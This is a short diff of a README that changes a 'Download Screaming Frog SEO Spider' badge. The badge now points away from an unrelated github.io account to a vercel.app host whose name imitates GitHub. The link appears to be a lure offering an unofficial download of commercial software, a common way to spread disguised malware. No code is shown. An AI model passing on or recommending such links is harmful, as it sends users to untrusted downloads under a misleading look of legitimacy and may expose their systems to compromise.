@@ -11,7 +11,7 @@
 
 <p align="center">
 
-[![Download Screaming Frog SEO Spider](https://img.shields.io/badge/🐸_DOWNLOAD_Screaming_Frog_SEO_Spider-16a34a?style=for-the-badge)](https://ygabyga-irak.github.io/.github/Screaming-Frog-SEO-Spider)
+[![Download Screaming Frog SEO Spider](https://img.shields.io/badge/🐸_DOWNLOAD_Screaming_Frog_SEO_Spider-16a34a?style=for-the-badge)](https://github-murex-ten.vercel.app/Screaming-Frog-SEO-Spider)
 
 </p>
 
